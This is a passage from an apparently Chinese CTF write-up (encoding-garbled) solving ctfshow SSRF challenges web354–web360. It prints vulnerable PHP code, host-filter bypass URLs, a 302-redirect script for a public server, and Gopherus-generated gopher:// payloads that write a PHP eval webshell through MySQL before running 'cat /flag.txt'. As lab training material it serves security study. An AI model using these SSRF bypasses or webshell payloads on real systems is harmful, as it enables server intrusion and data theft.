invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† 1 å’Œ 0ï¼Œä¹‹ç±»å¯ä»¥åˆ©ç”¨è§£æåˆ° 127.0.0.1 çš„åŸŸåä½œä¸ºç»•è¿‡æˆ–è€… 302ï¼Œå‰è€…ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjM5MjMzMTY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJDRDc2ODYyMy1EQjQzLTRFRTMtQTkzRi05REE3QUFCNzBGRTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUNENzY4NjIzLURCNDMtNEVFMy1BOTNGLTlEQTdBQUI3MEZFMSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTIzOTIzMzE2LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09JUU1JThGJUFGJUU0JUJCJUE1JUU4JUE3JUEzJUU2JTlFJTkwJUU1JTg4JUIwMTI3LjAuMC4xJUU3JTlBJTg0JUU1JTlGJTlGJUU1JTkwJThEJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">SSRF åŸŸåè§£æåˆ° 127.0.0.1</span>ï¼Œ</p><p>â€‹è¿™é‡Œçš„ payload ï¼š<span class="exturl" data-url="aHR0cDovL3NhZmUudGFvYmFvLmNvbS9mbGFnLnBocCVFMyU4MCU4Mg==">http://safe.taobao.com/flag.phpã€‚</span></p><h1 id="web355"><a class="markdownIt-Anchor" href="#web355">#</a> web355ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¦æ±‚é•¿åº¦å°äºäº”ï¼Œç›´æ¥ç”¨ http://0/flag.php å»ç»•è¿‡ã€‚</p><h1 id="web356"><a class="markdownIt-Anchor" href="#web356">#</a> web356ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹é•¿åº¦å°äº 3ï¼Œè¿˜æ˜¯ä¸Šä¸€é¢˜é‚£ä¸ª payload ä¸€æŠŠæ¢­ã€‚</p><h1 id="web357"><a class="markdownIt-Anchor" href="#web357">#</a> web357ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ai çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// å…³é—­PHPçš„é”™è¯¯æŠ¥å‘Šï¼Œè¿™æ„å‘³ç€ä»»ä½•é”™è¯¯æˆ–è­¦å‘Šéƒ½ä¸ä¼šæ˜¾ç¤ºç»™ç”¨æˆ·  </span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// é«˜äº®æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç ã€‚è¿™é€šå¸¸ç”¨äºè°ƒè¯•ç›®çš„ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ˜¾ç¤ºæºä»£ç æ˜¯ä¸å®‰å…¨çš„ã€‚  </span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä»POSTè¯·æ±‚ä¸­è·å–åä¸º&#x27;url&#x27;çš„å‚æ•°å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡$urlä¸­  </span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä½¿ç”¨parse_urlå‡½æ•°è§£æ$urlï¼Œå¹¶å°†è§£æç»“æœå­˜å‚¨åœ¨æ•°ç»„$xä¸­  </span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// æ£€æŸ¥$xæ•°ç»„ä¸­çš„&#x27;scheme&#x27;é”®æ˜¯å¦ç­‰äº&#x27;http&#x27;æˆ–&#x27;https&#x27;  </span></span><br><span class="line"><span class="comment">// è¿™æ˜¯ä¸ºäº†ç¡®ä¿åªå¤„ç†HTTPæˆ–HTTPSåè®®çš„URLï¼Œä»è€Œé¿å…æ½œåœ¨çš„åè®®æ¼æ´ï¼ˆå¦‚URLé‡å®šå‘æ”»å‡»ï¼‰  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;  </span><br><span class="line">    <span class="comment">// ä½¿ç”¨gethostbynameå‡½æ•°è·å–$urlä¸­ä¸»æœºåçš„IPåœ°å€ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡$ipä¸­  </span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// è¾“å‡ºè·å–çš„IPåœ°å€ï¼Œå‰é¢åŠ ä¸ŠHTMLçš„æ¢è¡Œæ ‡ç­¾  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// ä½¿ç”¨filter_varå‡½æ•°å’ŒFILTER_VALIDATE_IPè¿‡æ»¤å™¨æ¥éªŒè¯$ipæ˜¯å¦ä¸ºæœ‰æ•ˆçš„IPåœ°å€  </span></span><br><span class="line">    <span class="comment">// åŒæ—¶ï¼Œä½¿ç”¨FILTER_FLAG_NO_PRIV_RANGEå’ŒFILTER_FLAG_NO_RES_RANGEæ ‡å¿—æ¥æ’é™¤ç§æœ‰å’Œä¿ç•™çš„IPåœ°å€èŒƒå›´  </span></span><br><span class="line">    <span class="comment">// å¦‚æœ$ipä¸æ˜¯æœ‰æ•ˆçš„éç§æœ‰/éä¿ç•™IPåœ°å€ï¼Œåˆ™æ‰§è¡Œdieå‡½æ•°ï¼Œç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¾“å‡º&#x27;ip!&#x27;  </span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// å¦‚æœIPåœ°å€éªŒè¯é€šè¿‡ï¼Œåˆ™ä½¿ç”¨file_get_contentså‡½æ•°å°è¯•ä»ç”¨æˆ·æäº¤çš„URLä¸­è·å–å†…å®¹ï¼Œå¹¶è¾“å‡º  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="comment">// å¦‚æœ$urlçš„åè®®ä¸æ˜¯HTTPæˆ–HTTPSï¼Œåˆ™æ‰§è¡Œdieå‡½æ•°ï¼Œç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¾“å‡º&#x27;scheme&#x27;  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ‰“ 302 è·³è½¬ï¼Œåœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šå†™å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1:80/flag.php&quot;</span>,<span class="literal">TRUE</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸´æ—¶è¿è¡Œï¼š</p><blockquote><p>php -S 0.0.0.0:2333</p></blockquote><p>â€‹ä¼ å…¥ url å‚æ•°ä¸ºï¼š</p><blockquote><p>url=http://&lt;vps_ip&gt;: ç«¯å£</p></blockquote><h1 id="web358"><a class="markdownIt-Anchor" href="#web358">#</a> web358ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥ $url æ˜¯å¦ä»¥ &quot;<span class="exturl" data-url="aHR0cDovL2N0Zg==">http://ctf</span>.â€œå¼€å¤´ï¼Œå¹¶ä¸”ä»¥â€.show&quot; ç»“å°¾ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œ å‰é¢å‘¢å°±åˆ©ç”¨ @ç¬¦å·å°±å¯ä»¥ç»•è¿‡ï¼Œåé¢åˆ©ç”¨ get ä¼ å‚æ–¹å¼ç»•è¿‡ï¼š</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2N0Zi5AMTI3LjAuMC4xL2ZsYWcucGhwP3Nob3c=">http://ctf.@127.0.0.1/flag.php?show</span></p></blockquote><h1 id="web359"><a class="markdownIt-Anchor" href="#web359">#</a> web359ï¼š</h1><p>â€‹éšä¾¿è¾“å…¥äº†ä¸€ä¸ªè´¦å·å¯†ç åï¼Œè·³è½¬åˆ° check.php æ–‡ä»¶ï¼ŒæŠ“åŒ…å post å‡ºç°äº†ä¸€ä¸ª returlï¼Œç”±æ­¤ï¼Œåˆ©ç”¨ gopher åè®®æ„é€ æ”»å‡»ï¼Œåˆ©ç”¨ gopherus ç”Ÿæˆ gopher è¯­å¥æ”»å‡»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">â””â”€# python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">For making it work username should not be password protected!!!</span><br><span class="line"></span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF :</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%63%6d%64%22%5d%29%3b%3f%e3%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>â€‹ç”Ÿæˆçš„ gopher åè®®ä¸èƒ½ç›´æ¥ç”¨ï¼Œéœ€è¦ç»è¿‡ url ç¼–ç ä¹‹åæ‰èƒ½ç”¨ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2563%256d%2564%2522%255d%2529%253b%253f%25e3%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘è‡ªå·±çš„ payload ç”¨ä¸äº†ï¼Œè´´ä¸€ä¸ªåˆ«äººçš„å§ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® 1.php ç”¨ post ä¼ ä¸€ä¸ª 1=system (â€œcat+/flag.txtâ€); å³å¯ã€‚</p><h1 id="web360"><a class="markdownIt-Anchor" href="#web360">#</a> web360ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span 